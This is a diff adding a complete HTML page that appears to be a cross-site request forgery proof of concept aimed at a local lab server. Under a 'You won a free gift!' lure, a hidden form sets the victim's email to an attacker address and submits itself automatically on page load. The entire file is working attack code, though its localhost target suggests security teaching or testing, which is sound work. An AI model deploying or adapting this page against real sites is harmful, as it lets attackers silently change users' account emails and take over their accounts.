@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Free Gift</title>
+</head>
+
+<body>
+
+    <h1>You won a free gift!</h1>
+
+    <form action="http://localhost:8000/change-email.php" method="POST">
+
+        <input
+            type="hidden"
+            name="email"
+            value="attacker@gmail.com"
+        >
+
+    </form>
+
+    <script>
+
+        document.forms[0].submit();
+
+    </script>
+
+</body>
+
+</html>
